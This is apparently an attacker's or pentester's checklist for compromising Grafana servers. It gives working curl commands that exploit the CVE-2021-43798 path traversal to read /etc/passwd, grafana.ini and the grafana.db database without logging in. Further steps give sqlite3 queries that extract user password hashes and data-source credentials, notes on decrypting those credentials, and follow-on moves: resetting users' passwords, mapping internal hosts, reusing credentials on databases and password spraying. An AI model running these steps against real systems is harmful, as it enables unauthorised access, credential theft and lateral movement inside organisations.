# Grafana

## Before I start
- [ ] Port 3000 by default; the version from the login page and from the health endpoint
curl -sk <Scheme>://<WebHost>/api/health
- [ ] admin with admin first

## CVE-2021-43798, file read with no login
- [ ] Versions 8.0.0 to 8.3.0
curl -sk --path-as-is <Scheme>://<WebHost>/public/plugins/alertlist/../../../../../../etc/passwd
curl -sk --path-as-is <Scheme>://<WebHost>/public/plugins/grafana/../../../../../../etc/grafana/grafana.ini
curl -sk --path-as-is <Scheme>://<WebHost>/public/plugins/grafana/../../../../../../var/lib/grafana/grafana.db -o grafana.db
- [ ] Any installed plugin's ID works in the path: alertlist, grafana, piechart, table, prometheus
- [ ] Without --path-as-is curl removes the ../ itself

## What the files hold
sqlite3 grafana.db 'select email,login,password from user;'
sqlite3 grafana.db 'select name,url,user,password,secure_json_data from data_source;'
- [ ] Data source passwords are AES-encrypted with secret_key from grafana.ini: decrypted, they are the databases' own passwords
- [ ] User passwords are PBKDF2 hashes: :Pb hash-cracking

## As an administrator
- [ ] Server Admin, Users: any user's password reset, for an account to move on with
- [ ] Dashboards and Explore: the internal hosts, names and addresses the data sources reach

## If it fails
- [ ] 404 on every plugin: patched, so searchsploit grafana for this build, such as CVE-2024-9264 in the DuckDB SQL expressions: :Pb web-cves

## Next
- [ ] Data source credentials on the databases themselves: :Pb mysql, :Pb postgresql
- [ ] The same passwords everywhere else: :Pb spraying
